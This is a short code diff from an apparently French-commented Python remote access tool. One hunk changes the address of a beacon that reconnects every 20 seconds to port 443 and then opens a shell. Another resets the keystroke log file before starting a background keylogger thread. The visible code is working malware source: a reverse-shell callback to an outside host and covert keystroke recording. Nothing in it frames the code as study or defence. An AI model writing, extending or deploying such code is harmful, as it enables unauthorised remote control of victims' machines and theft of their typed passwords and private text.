@@ -61,7 +61,7 @@ def connection():
     while True:
         time.sleep(20)
         try:
-            s.connect(("192.168.100.9", 443))
+            s.connect(("192.168.1.34", 443))
             shell()
             break  # Exit loop after successful shell session
         except socket.error as e:
@@ -88,8 +88,16 @@ def record_keystrokes():
 # Fonction pour démarrer l'enregistrement
 def start_keylogger():
     global is_recording
+    # Réinitialiser le fichier de frappes au début
+    try:
+        with open(keystroke_file_path, 'w') as data_file:
+            data_file.write("")  # Vider le contenu
+    except Exception as e:
+        print(f"Error resetting keystroke file: {str(e)}")
+    
     is_recording = True
     threading.Thread(target=record_keystrokes, daemon=True).start()
+
 
 # Fonction pour arrêter l'enregistrement
 def stop_keylogger():
